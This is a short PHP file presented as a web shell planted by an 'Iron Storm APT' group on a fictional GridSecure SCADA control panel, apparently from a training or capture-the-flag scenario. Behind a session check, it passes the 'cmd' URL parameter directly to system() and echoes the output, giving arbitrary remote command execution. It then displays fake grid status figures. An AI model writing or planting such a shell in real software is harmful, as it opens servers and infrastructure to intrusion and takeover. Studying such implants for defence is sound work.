<?php
// Iron Storm APT Web Shell - Emergency Access Interface
// GridSecure Industries - Compromised SCADA Control v1.2.3
// WARNING: This system has been compromised by Iron Storm APT group

session_start();
if (!isset($_SESSION['gridsecure_auth'])) {
    // Emergency access disabled - contact system administrator
    echo "<h2>GridSecure Emergency Access</h2>";
    echo "<p>Access temporarily disabled for security reasons.</p>";
    echo "<p>Contact: security@gridsecure.com</p>";
    exit;
}

// Command execution interface for emergency SCADA control
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre>";
    system($cmd);
    echo "</pre>";
}

echo "<h2>SCADA Emergency Control Panel</h2>";
echo "<p>System Status: <span style='color: green;'>NOMINAL</span></p>";
echo "<p>Connected RTUs: 247</p>";
echo "<p>Grid Load: 78.3%</p>";
echo "<p>Frequency: 60.02 Hz</p>";
?>
